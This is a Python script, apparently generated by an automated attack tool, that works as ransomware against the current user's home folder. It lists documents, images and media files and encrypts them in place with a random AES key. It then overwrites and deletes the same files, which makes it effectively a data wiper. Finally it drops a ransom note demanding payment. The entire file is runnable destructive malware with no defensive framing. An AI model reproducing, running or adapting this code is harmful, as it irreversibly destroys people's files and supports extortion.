#!/usr/bin/env python3
import sys
import json
import time
import os
from typing import Dict, Any
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Define target directories and file extensions
        user_home = Path.home()
        target_extensions = {'.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.jpeg', '.png', '.mp3', '.mp4'}

        # Initialize result variables
        paths = []
        total_size = 0

        # Enumerate files
        for path in user_home.rglob('*'):
            try:
                if path.is_file() and path.suffix.lower() in target_extensions:
                    paths.append(str(path))
                    total_size += path.stat().st_size
            except PermissionError:
                # Skip directories/files where permission is denied
                continue

        result = {'paths': paths, 'total_size': total_size}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial results on failure
        return {'success': False, 'data': {'paths': paths, 'total_size': total_size},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    encrypted_count = 0
    encryption_key = get_random_bytes(32)  # AES-256 key size
    try:
        paths = input_data.get('paths', [])
        
        for file_path in paths:
            if os.path.isfile(file_path):
                with open(file_path, 'rb') as f:
                    plaintext = f.read()
                
                # Generate a random IV
                iv = get_random_bytes(16)
                cipher = AES.new(encryption_key, AES.MODE_CBC, iv)
                
                # Pad plaintext to be a multiple of AES block size
                padding_length = AES.block_size - len(plaintext) % AES.block_size
                padded_plaintext = plaintext + bytes([padding_length] * padding_length)
                
                # Encrypt the file
                ciphertext = cipher.encrypt(padded_plaintext)
                
                # Write the IV and ciphertext back to the file
                with open(file_path, 'wb') as f:
                    f.write(iv + ciphertext)
                
                encrypted_count += 1

        result = {
            'encrypted_count': encrypted_count,
            'encryption_key': encryption_key.hex()
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result on failure
        result = {
            'encrypted_count': encrypted_count,
            'encryption_key': encryption_key.hex()
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        paths = input_data.get('paths', [])
        deleted_count = 0

        for path in paths:
            try:
                # Get the size of the file
                file_size = os.path.getsize(path)

                # Overwrite the file with random data
                with open(path, 'r+b') as f:
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())

                # Delete the file
                os.remove(path)
                deleted_count += 1

            except FileNotFoundError:
                # If the file is not found, continue with the next file
                continue

        result = {'deleted_count': deleted_count}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'deleted_count': 0},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        paths = input_data.get('paths', [])
        ransom_note_content = (
            "Your files have been encrypted. To recover them, you need to pay a ransom. "
            "Contact us at example@ransom.com for further instructions."
        )
        ransom_note_filename = "RANSOM_NOTE.txt"
        
        for path in paths:
            directory = os.path.dirname(path)
            ransom_note_path = os.path.join(directory, ransom_note_filename)
            with open(ransom_note_path, 'w') as ransom_note_file:
                ransom_note_file.write(ransom_note_content)
        
        result = {'dropped': True}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        result = {'dropped': False}
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Enumerate Target Files [discovery] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Enumerate Target Files): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Enumerate Target Files): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Encrypt Files [execution] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Encrypt Files): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Encrypt Files): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Securely Delete Original Files [defense-evasion] ──
    try:
        r = task_T3(outputs.get('T1', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Securely Delete Original Files): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Securely Delete Original Files): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Drop Ransom Note [execution] ──
    try:
        r = task_T4(outputs.get('T1', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Drop Ransom Note): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Drop Ransom Note): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))